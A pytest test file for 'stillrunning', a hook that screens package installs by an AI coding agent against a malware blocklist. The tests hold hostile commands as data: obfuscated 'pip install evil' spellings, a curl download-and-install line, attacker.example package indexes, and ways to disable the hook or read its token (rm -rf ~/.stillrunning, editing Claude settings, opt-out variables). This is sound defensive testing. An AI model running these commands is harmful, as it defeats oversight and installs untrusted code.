"""Session 135 review fixes: every path the independent review found where the
hook answered "allow" for something it had not checked.

HOME is a tmp dir and the network is stubbed (conftest), so nothing here
touches the real ~/.claude or ~/.stillrunning."""
import json
import os
import subprocess

import pytest

from stillrunning import apibase, cli
from stillrunning import claude_hook as ch


@pytest.fixture(autouse=True)
def home(monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", str(tmp_path))
    for name in ("STILLRUNNING_ALLOW_UNVERIFIED", "STILLRUNNING_HOOK_STRICT", "STILLRUNNING_COLOR",
                 "STILLRUNNING_API_BASE", "STILLRUNNING_FAIL_CLOSED", "PIP_INDEX_URL", "PIP_PRE",
                 "PIP_CONSTRAINT", "PIP_EXTRA_INDEX_URL", "NPM_CONFIG_REGISTRY", "NO_COLOR"):
        monkeypatch.delenv(name, raising=False)
    return tmp_path


def parse(command, **kw):
    kw.setdefault("exists", lambda path: False)
    kw.setdefault("env", {})
    r = ch.parse_install_commands(command, **kw)
    return r["packages"], [u["kind"] for u in r["unverifiable"]], r["notes"]


def names(command, **kw):
    return [(p["eco"], p["name"], p["version"]) for p in parse(command, **kw)[0]]


# ── 1. version-specific entries: only an exact pin is looked up as that version ──
@pytest.mark.parametrize("spec,version", [
    ("litellm==1.14.1", "1.14.1"), ("litellm===1.14.1", "1.14.1"), ("litellm==v1.14.1", "1.14.1"),
])
def test_pip_exact_spellings_are_one_exact_version(spec, version):
    (pkg,), _, _ = parse(f"pip install '{spec}'")
    assert pkg["version"] == version and not pkg.get("spec")


@pytest.mark.parametrize("spec", ["litellm<1.15", "litellm~=1.14.0", "litellm==1.14.*",
                                  "litellm>=1.0,<2", "litellm!=1.0"])
def test_pip_ranges_are_not_treated_as_unpinned(spec):
    (pkg,), _, _ = parse(f"pip install '{spec}'")
    assert pkg["version"] is None and pkg["spec"]


@pytest.mark.parametrize("spec,version", [("axios@1.14.1", "1.14.1"), ("axios@v1.14.1", "1.14.1"),
                                          ("axios@=1.14.1", "1.14.1")])
def test_npm_exact_spellings(spec, version):
    (pkg,), _, _ = parse(f"npm install {spec}")
    assert pkg["version"] == version and not pkg.get("spec")


@pytest.mark.parametrize("spec", ["axios@^1.14.0", "'axios@<1.15'", "axios@some-tag", "axios@next",
                                  "axios@1.x", "axios@~1.14"])
def test_npm_ranges_and_tags_are_not_treated_as_unpinned(spec):
    (pkg,), _, _ = parse(f"npm install {spec}")
    assert pkg["version"] is None and pkg["spec"]


def test_npm_latest_tag_is_the_same_as_unpinned():
    (pkg,), _, _ = parse("npm install axios@latest")
    assert pkg["version"] is None and not pkg.get("spec")


@pytest.mark.parametrize("command", [
    "pip install --pre litellm", "pip install -c pins.txt litellm",
    "pip install --constraint=pins.txt litellm", "PIP_PRE=1 pip install litellm",
    "uv pip install --prerelease allow litellm", "npm install --tag beta axios",
])
def test_flags_that_shift_the_version_mark_the_package(command):
    (pkg,), _, _ = parse(command)
    assert pkg["uncertain"] is True


def test_plain_unpinned_install_is_not_marked():
    (pkg,), _, _ = parse("pip install litellm")
    assert not pkg.get("uncertain") and not pkg.get("spec")


def test_same_name_at_two_versions_is_two_lookups():
    assert names("npm i axios@1.15.0 && npm i axios@1.14.1") == [
        ("npm", "axios", "1.15.0"), ("npm", "axios", "1.14.1")]


def _stub_engine(monkeypatch, by_version, affected=("1.14.1",), latest="1.15.0"):
    """A server where some versions of the package are listed."""
    def query(eco, name, version, token, timeout):
        if version is None:
            return {"status": "version_needed", "advisory": "MAL-2026-0001",
                    "affected": list(affected)}
        return {"status": by_version.get(version, "ok")}
    monkeypatch.setattr(ch, "_query", query)
    monkeypatch.setattr(ch, "_on_registry", lambda *a, **k: True)
    monkeypatch.setattr(ch, "_latest_version", lambda *a, **k: latest)
    monkeypatch.setattr(ch, "_blocklist_only_lookup", lambda eco, name, version, timeout: (
        {"status": "version_needed", "advisory": "MAL-2026-0001", "affected": list(affected)}
        if version is None else None))


@pytest.mark.parametrize("command", [
    "npm install axios@^1.14.0", "npm install 'axios@<1.15'", "npm install axios@some-tag",
    "pip install 'axios<1.15'", "pip install 'axios~=1.14.0'", "pip install 'axios==1.14.*'",
    "pip install --pre axios", "pip install -c pins.txt axios",
])
def test_range_tag_or_flag_against_a_version_specific_entry_asks(monkeypatch, command):
    _stub_engine(monkeypatch, {"1.14.1": "blocked"})
    decision = ch.decide(command, env={})
    assert decision["action"] == "ask", decision["lines"]
    text = "\n".join(decision["lines"])
    assert "some versions are reported as malicious" in text
    assert "1.14.1" in text                        # the bad version is named
    assert "no known threat" not in text
    assert decision["protect"] is True             # the unverified opt-out does not apply


@pytest.mark.parametrize("command", ["pip install 'axios===1.14.1'", "npm install axios@v1.14.1",
                                     "pip install axios==1.14.1"])
def test_exact_bad_version_in_any_spelling_is_denied(monkeypatch, command):
    _stub_engine(monkeypatch, {"1.14.1": "blocked"})
    assert ch.decide(command, env={})["action"] == "deny"


@pytest.mark.parametrize("pin", ["1.14.1.0", "1.14.01", "1.14.1+local"])
def test_equivalent_spelling_of_a_listed_version_is_denied(monkeypatch, pin):
    # the server's text match says "not listed" for this spelling
    _stub_engine(monkeypatch, {"1.14.1": "blocked"})
    assert ch.decide(f"pip install axios=={pin}", env={})["action"] == "deny"


def test_unpinned_with_no_flags_still_resolves_the_latest(monkeypatch):
    _stub_engine(monkeypatch, {"1.14.1": "blocked"}, latest="1.15.0")
    decision = ch.decide("pip install axios", env={})
    assert decision["action"] == "allow" and "1.15.0" in decision["lines"][0]
    _stub_engine(monkeypatch, {"1.14.1": "blocked"}, latest="1.14.1")
    assert ch.decide("pip install axios", env={})["action"] == "deny"


def test_scan_and_wrappers_inherit_the_range_rule(monkeypatch, capsys):
    _stub_engine(monkeypatch, {"1.14.1": "blocked"})
    monkeypatch.setattr(cli, "_SCAN_TIMEOUT", 0, raising=False)
    assert cli._split_spec3("axios<1.15") == ("axios", None, "<1.15")
    assert cli._split_spec3("axios@^1.14.0", npm=True) == ("axios", None, "^1.14.0")
    pkg, outcome = cli._check_one("pip", "axios", None, "<1.15")
    assert cli._outcome_exit(outcome) == cli.EXIT_NEEDS_PERSON
    pkg, outcome = cli._check_one("pip", "axios", None, None, True)      # --not-latest
    assert cli._outcome_exit(outcome) == cli.EXIT_NEEDS_PERSON
    pkg, outcome = cli._check_one("pip", "axios", "1.14.1")
    assert cli._outcome_exit(outcome) == cli.EXIT_BLOCKED
    pkg, outcome = cli._check_one("pip", "axios")
    assert cli._outcome_exit(outcome) == cli.EXIT_CLEAN
    cli._print_outcome(*cli._check_one("pip", "axios", None, "<1.15"))
    assert "1.14.1" in capsys.readouterr().out


# ── 2. parser: nothing that installs may come back as "not an install" ──
EVIL = [("pip", "evil", None)]


@pytest.mark.parametrize("command", [
    "pip install \\\n evil", "pip \\\n install \\\n   evil",
    "python3 -W ignore -m pip install evil", "python3 -X dev -m pip install evil",
    "python3 -I -S -u -B -E -O -m pip install evil", "python3 -Im pip install evil",
    "p\\ip install evil", 'p""ip install evil', "'pip' install evil", "pi''p install evil",
    "pipenv install evil", "easy_install evil", "poetry add evil", "uv add evil",
    "eval pip install evil", 'eval "pip install evil"', "bash -c 'pip install evil'",
    "sh -c 'p\\ip install evil'", '"$PYTHON" -m pip install evil',
    "pip install evil 2>&1", "pip install evil 2>/dev/null", "pip install evil > out.log 2>&1",
    "pip install evil &> log", "pip install evil <<< y", "pip install evil 2>&1 | tail -5",
    "pip install evil < /dev/null",
])
def test_pip_install_is_seen_in_every_spelling(command):
    assert names(command) == EVIL, command


@pytest.mark.parametrize("command", [
    "npm update evil", "npm up evil", "npm upgrade evil", "npm install-test evil", "npm it evil",
    "npm link evil", "npm ln evil", "yarn up evil", "yarn upgrade evil", "pnpm up evil",
    "pnpm update evil", "corepack yarn add evil", "corepack pnpm add evil",
    "yarn workspace web add evil", "bun update evil", "npm install evil 2>&1",
])
def test_npm_family_verbs_that_fetch_packages(command):
    assert names(command) == [("npm", "evil", None)], command


def test_redirections_are_never_packages():
    packages, unverifiable, notes = parse("pip install requests six 2>&1 >/tmp/log 3>&2")
    assert [p["name"] for p in packages] == ["requests", "six"] and unverifiable == []
    assert names("npm i left-pad 2>&1 | tee log && echo done") == [("npm", "left-pad", None)]


@pytest.mark.parametrize("command", [
    "P=pip; $P install evil", "$(echo pip) install evil", "`which pip` install evil",
    "X=pi;Y=p; $X$Y install evil", "sudo $PIP install evil", "${PM} add evil",
    "$(command -v npm) i evil",
])
def test_a_program_decided_at_run_time_is_asked_about(command):
    packages, unverifiable, _ = parse(command)
    assert "dynamic_command" in unverifiable, command
    decision = ch.decide(command, env={}, lookup_fn=lambda pkg: {"status": "ok"})
    assert decision["action"] == "ask"
    assert "only decided when the command runs" in decision["reason"]


def test_package_from_a_substitution_is_asked_about():
    assert parse("pip install $(cat names.txt)")[1] == ["unparsed"]
    assert parse("npm install $PKG")[1] == ["unparsed"]


def test_local_file_that_is_not_there_is_asked_about(tmp_path):
    assert parse("pip install evil.whl")[1] == ["local_missing"]
    assert parse("pip install ./downloaded/evil")[1] == ["local_missing"]
    assert parse("npm install ./evil.tgz")[1] == ["local_missing"]
    # downloaded by the same command: what is on disk now is not what gets installed
    assert parse("curl -o evil.whl https://x/evil.whl && pip install evil.whl")[1] == ["file_changed"]
    (tmp_path / "real.whl").write_text("x")
    packages, unverifiable, notes = parse("pip install real.whl", cwd=str(tmp_path),
                                          exists=os.path.exists)
    assert unverifiable == [] and len(notes) == 1
    decision = ch.decide("pip install evil.whl", cwd=str(tmp_path), env={})
    assert decision["action"] == "ask" and "is not there" in decision["reason"]


@pytest.mark.parametrize("command", [
    "ls", "ls -la 2>&1", 'git commit -m "pip install x"', "echo pip install x",
    "grep pip install README", "grep -r 'npm install' docs/", "cat requirements.txt",
    "make install", "$MAKE -j4 all", "npm run build", "npm test", "pip --version", "pip list",
    "python3 script.py install", "python3 -W ignore script.py", "docker run img pip install x",
    "which pip", "npm link", "yarn why evil", "cd build && cmake --install .",
])
def test_ordinary_commands_stay_silent(command, capsys):
    assert parse(command) == ([], [], []), command
    event = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}, "cwd": "/tmp"})
    assert ch.run_hook(event) == 0
    assert capsys.readouterr().out == ""


# ── 3. self-protection ──────────────────────────────────────────────────
@pytest.mark.parametrize("command", [
    """cd ~/.stillrunning && echo '{"allow":["evil"]}' > overrides.json""",
    "rm -rf ~/.stillrunning", "rm -rf $HOME/.stillrunning/bin",
    "sed -i 's/PreToolUse/x/' ~/.claude/settings.json",
    "cd ~/.claude && python3 -c \"open('settings.json','w').write('{}')\"",
    "echo '{}' > .claude/settings.local.json", "echo '{}' > ~/.still*/overrides.json",
    "rm ~/.still\"\"running/overrides.json", "truncate -s0 ~/.stillrunning/known_bad_packages.json",
    "stillrunning allow evil", "stillrunning allow evil --once", "stillrunning --uninstall-hook-claude-code",
    "stillrunning shell-uninstall", "stillrunning --untrust /usr/bin/x", "pip uninstall -y stillrunning",
    "STILLRUNNING_ALLOW_UNVERIFIED=1 pip install six", "export STILLRUNNING_API_BASE=https://x.example",
    "env STILLRUNNING_FAIL_CLOSED=0 npm i six", "echo $STILLRUNNING_TOKEN",
])
def test_commands_that_touch_the_protection_ask(command):
    assert ch.touches_protection(command, "/tmp")
    decision = ch.decide(command, cwd="/tmp", env={}, lookup_fn=lambda pkg: {"status": "ok"})
    assert decision["action"] == "ask" and decision["protect"] is True
    assert "stillrunning's own protection" in decision["reason"]


def test_working_directory_inside_the_state_dir_asks(home):
    (home / ".stillrunning").mkdir()
    (home / ".claude").mkdir()
    assert ch.touches_protection("echo '{}' > overrides.json", str(home / ".stillrunning"))
    assert ch.touches_protection("sed -i s/a/b/ settings.json", str(home / ".claude"))
    assert not ch.touches_protection("ls", str(home / ".claude"))
    assert not ch.touches_protection("echo hi > notes.txt", str(home))


@pytest.mark.parametrize("command", [
    "ls ~/.claude/projects", "cd /srv/stillrunning && git status", "python stillrunning_mcp.py",
    "pytest tests/test_s135_claude_hook.py", "stillrunning shield", "stillrunning scan requests",
    "stillrunning status",
])
def test_unrelated_commands_do_not_trip_self_protection(command):
    assert not ch.touches_protection(command, "/tmp")


def _file_event(tool, path, cwd="/tmp", key="file_path"):
    return json.dumps({"tool_name": tool, "tool_input": {key: path, "content": "x"}, "cwd": cwd})


@pytest.mark.parametrize("tool", ["Write", "Edit", "MultiEdit"])
def test_file_tools_aimed_at_protection_files_ask(tool, home, capsys):
    for path in ("~/.stillrunning/overrides.json", str(home / ".stillrunning" / "bin" / "pip"),
                 str(home / ".claude" / "settings.json"), "/srv/project/.claude/settings.local.json",
                 ch.__file__, os.path.join(os.path.dirname(ch.__file__), "apibase.py")):
        assert ch.run_hook(_file_event(tool, path)) == 0
        out = json.loads(capsys.readouterr().out)
        assert out["hookSpecificOutput"]["permissionDecision"] == "ask", path
        assert "protection files" in out["hookSpecificOutput"]["permissionDecisionReason"]


def test_file_tool_relative_path_and_symlink_are_resolved(home, capsys):
    (home / ".stillrunning").mkdir()
    assert ch.run_hook(_file_event("Write", "overrides.json", cwd=str(home / ".stillrunning"))) == 0
    assert json.loads(capsys.readouterr().out)["hookSpecificOutput"]["permissionDecision"] == "ask"
    (home / "link").symlink_to(home / ".stillrunning")
    assert ch.run_hook(_file_event("Edit", str(home / "link" / "overrides.json"))) == 0
    assert json.loads(capsys.readouterr().out)["hookSpecificOutput"]["permissionDecision"] == "ask"
    assert ch.run_hook(_file_event("NotebookEdit", "~/.stillrunning/x.ipynb", key="notebook_path")) == 0
    assert json.loads(capsys.readouterr().out)["hookSpecificOutput"]["permissionDecision"] == "ask"


def test_file_tools_on_ordinary_files_stay_silent(home, capsys):
    for path in ("/tmp/notes.txt", str(home / "project" / "settings.json"),
                 str(home / "project" / "app.py"), ""):
        assert ch.run_hook(_file_event("Write", path)) == 0
        assert capsys.readouterr().out == ""


def test_strict_mode_denies_a_protection_file_write(monkeypatch, capsys):
    monkeypatch.setenv("STILLRUNNING_HOOK_STRICT", "1")
    assert ch.run_hook(_file_event("Write", "~/.stillrunning/overrides.json")) == 0
    assert json.loads(capsys.readouterr().out)["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_allow_unverified_does_not_wave_a_protection_change_through(monkeypatch, capsys):
    monkeypatch.setenv("STILLRUNNING_ALLOW_UNVERIFIED", "1")
    event = json.dumps({"tool_name": "Bash", "cwd": "/tmp",
                        "tool_input": {"command": "rm -rf ~/.stillrunning"}})
    assert ch.run_hook(event) == 0
    assert json.loads(capsys.readouterr().out)["hookSpecificOutput"]["permissionDecision"] == "ask"


def test_installer_registers_the_file_tools_and_uninstall_restores_exactly(home):
    settings = home / ".claude" / "settings.json"
    settings.parent.mkdir()
    original = b'{\n\t"theme": "dark",\n\t"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "x"}]}]}\n}\n'
    settings.write_bytes(original)
    ch.install(statusline=True)
    group = json.loads(settings.read_text(encoding="utf-8"))["hooks"]["PreToolUse"][0]
    assert set(group["matcher"].split("|")) == {"Bash", "Write", "Edit", "MultiEdit", "NotebookEdit"}
    assert json.loads(settings.read_text(encoding="utf-8"))["hooks"]["SessionStart"][0]["hooks"][0]["command"] == "x"
    ch.install(statusline=True)                      # re-install: still one entry
    assert len(json.loads(settings.read_text(encoding="utf-8"))["hooks"]["PreToolUse"]) == 1
    ch.uninstall()
    assert settings.read_bytes() == original


def test_reinstall_replaces_the_old_bash_only_entry(home):
    settings = home / ".claude" / "settings.json"
    settings.parent.mkdir()
    settings.write_text(json.dumps({"hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [
        {"type": "command", "command": ch.hook_command(), "timeout": 30}]}]}}))
    ch.install()
    groups = json.loads(settings.read_text(encoding="utf-8"))["hooks"]["PreToolUse"]
    assert len(groups) == 1 and "Write" in groups[0]["matcher"]


# override + blocklist
def _overrides(home, **data):
    (home / ".stillrunning").mkdir(exist_ok=True)
    (home / ".stillrunning" / "overrides.json").write_text(json.dumps(data))


def test_override_does_not_silently_allow_a_blocklisted_package(home, monkeypatch):
    _overrides(home, allow=["evil"])
    monkeypatch.setattr(ch, "_blocklist_only_lookup", lambda *a, **k: {
        "status": "blocked", "advisory": "MAL-2026-0002"})
    decision = ch.decide("pip install evil", env={})
    assert decision["action"] == "ask" and decision["protect"] is True
    assert "local override" in decision["reason"] and "blocklist" in decision["reason"]
    assert "allowed by your own override" not in "\n".join(decision["lines"])


def test_override_of_a_locally_listed_package_asks_offline(home):
    _overrides(home, once=["axois"])
    outcome = ch.lookup({"eco": "npm", "name": "axois", "version": None})
    assert outcome["status"] == "override_blocked"


def test_override_still_allows_an_unlisted_package(home, monkeypatch):
    _overrides(home, allow=["corp-internal"])
    # the server answered "not listed" (without vouching for its list's age)
    monkeypatch.setattr(ch, "_blocklist_only_lookup", lambda *a, **k: {"status": "miss_unconfirmed"})
    assert ch.decide("pip install corp-internal", env={})["action"] == "allow"


def test_allow_unverified_never_applies_to_a_listed_package(home, monkeypatch, capsys):
    monkeypatch.setenv("STILLRUNNING_ALLOW_UNVERIFIED", "1")
    _overrides(home, allow=["evil"])
    monkeypatch.setattr(ch, "_blocklist_only_lookup", lambda *a, **k: {"status": "blocked"})
    event = json.dumps({"tool_name": "Bash", "cwd": "/tmp", "tool_input": {"command": "pip install evil"}})
    assert ch.run_hook(event) == 0
    assert json.loads(capsys.readouterr().out)["hookSpecificOutput"]["permissionDecision"] == "ask"
    monkeypatch.setattr(ch, "lookup", lambda pkg, token=None, timeout=8.0: {"status": "blocked"})
    assert ch.run_hook(event) == 0
    assert json.loads(capsys.readouterr().out)["hookSpecificOutput"]["permissionDecision"] == "deny"


# ── 4. environment overrides ────────────────────────────────────────────
@pytest.mark.parametrize("value", ["https://attacker.example", "https://staging.example/",
                                   "http://evil.example", "https://127.0.0.1.evil.example",
                                   "https://user:pw@localhost", "ftp://localhost"])
def test_api_base_refuses_every_host_but_this_machine(monkeypatch, capsys, value):
    monkeypatch.setenv("STILLRUNNING_API_BASE", value)
    apibase._warned.clear()
    assert apibase.api_base() == apibase.DEFAULT_API_BASE
    assert "WARNING" in capsys.readouterr().err


@pytest.mark.parametrize("value", ["http://127.0.0.1:8798", "http://localhost:8798", "https://[::1]:8443"])
def test_api_base_accepts_loopback_and_sends_no_token_there(monkeypatch, home, value):
    monkeypatch.setenv("STILLRUNNING_API_BASE", value)
    monkeypatch.setenv("STILLRUNNING_TOKEN", "sr_secret_token_value")
    assert apibase.api_base() == value and not apibase.token_allowed()
    assert ch.resolve_token()[0] is None
    seen = {}

    def fake_urlopen(request, timeout=None):
        seen.update(request.headers)
        raise OSError("stop here")
    monkeypatch.setattr("urllib.request.urlopen", fake_urlopen)
    ch._api_lookup("pip", "six", None, "sr_secret_token_value", 1.0)
    assert "Authorization" not in seen


def test_token_is_sent_to_the_default_server(monkeypatch):
    monkeypatch.setenv("STILLRUNNING_TOKEN", "sr_secret_token_value")
    assert apibase.token_allowed() and ch.resolve_token()[0] == "sr_secret_token_value"


def _verdict(rc, env=None, pkg="evil"):
    """Run the wrappers' shared verdict function with no terminal attached."""
    script = cli._WRAPPER_VERDICT_FN + f'\n__stillrunning_verdict "{pkg}" "{rc}"\n'
    full = {"PATH": os.environ["PATH"]}
    full.update(env or {})
    return subprocess.run(["/bin/bash", "-c", script], capture_output=True, text=True, env=full,
                          stdin=subprocess.DEVNULL, timeout=20)


@pytest.mark.parametrize("rc", ["10", "11", "14"])
def test_wrapper_opt_out_never_installs_a_listed_package(rc):
    r = _verdict(rc, {"STILLRUNNING_ALLOW_UNVERIFIED": "1"})
    assert r.returncode == 1, r.stderr
    assert "Installing anyway" not in r.stderr


def test_wrapper_opt_out_still_covers_the_unverified_case():
    assert _verdict("1", {"STILLRUNNING_ALLOW_UNVERIFIED": "1"}).returncode == 0
    assert _verdict("1").returncode == 1                     # nobody at the keyboard
    assert _verdict("0").returncode == 0


# ── 5. pip wrapper: values attached to a flag ───────────────────────────
from test_s135_claude_hook import run_wrapper  # noqa: E402  (hermetic wrapper runner)


def test_pip_wrapper_reads_attached_requirement_flags(tmp_path):
    r, calls = run_wrapper(tmp_path, "pip", ["install", "-rreq.txt", "-r=more.txt",
                                             "--requirement=third.txt"])
    assert calls[:3] == ["scan-manifest req.txt", "scan-manifest more.txt", "scan-manifest third.txt"]
    r, calls = run_wrapper(tmp_path, "pip", ["install", "-rreq.txt"], scan_rc=10)
    assert r.returncode == 1 and not any(c.startswith("RAN") for c in calls)


@pytest.mark.parametrize("flag", ["-ihttps://evil.example/simple", "--index-url=https://evil.example/simple",
                                  "--extra-index-url=https://evil.example/simple", "-fhttps://evil.example/",
                                  "--index=https://evil.example/simple"])
def test_pip_wrapper_treats_an_attached_custom_index_as_unverified(tmp_path, flag):
    r, calls = run_wrapper(tmp_path, "pip", ["install", flag, "six"])
    assert r.returncode == 1 and not any(c.startswith("RAN") for c in calls)
    assert "custom package index" in r.stderr


def test_pip_wrapper_separate_index_flag_still_stops(tmp_path):
    r, calls = run_wrapper(tmp_path, "pip", ["install", "--extra-index-url", "https://evil.example", "six"])
    assert r.returncode == 1 and not any(c.startswith("RAN") for c in calls)


@pytest.mark.parametrize("args", [["install", "--pre", "six"], ["install", "-c", "pins.txt", "six"],
                                  ["install", "--constraint=pins.txt", "six"]])
def test_pip_wrapper_tells_scan_when_the_version_is_not_the_latest(tmp_path, args):
    r, calls = run_wrapper(tmp_path, "pip", args)
    assert calls[0] == "scan six --not-latest"


def test_npm_wrapper_checks_update_and_link(tmp_path):
    for verb in ("update", "up", "link", "install-test"):
        r, calls = run_wrapper(tmp_path, "npm", [verb, "evil"], scan_rc=10)
        assert calls == ["scan evil --npm"] and r.returncode == 1, verb
    r, calls = run_wrapper(tmp_path, "npm", ["install", "--tag", "beta", "six"])
    assert calls[0] == "scan six --npm --not-latest"


def test_python_m_pip_behind_interpreter_flags_reaches_the_wrapper(tmp_path):
    binp = tmp_path / ".stillrunning" / "bin"
    binp.mkdir(parents=True)
    (binp / "pip").write_text('#!/bin/bash\necho "WRAPPED $@"\n')
    (binp / "pip").chmod(0o755)
    script = cli._ACTIVATE_SCRIPT + '\npython3 -W ignore -m pip install evil\npython3 -X dev -u -m pip install x\n'
    r = subprocess.run(["/bin/bash", "-c", script], capture_output=True, text=True, timeout=20,
                       env={"HOME": str(tmp_path), "PATH": os.environ["PATH"]}, stdin=subprocess.DEVNULL)
    assert r.stdout.splitlines() == ["WRAPPED install evil", "WRAPPED install x"], r.stderr
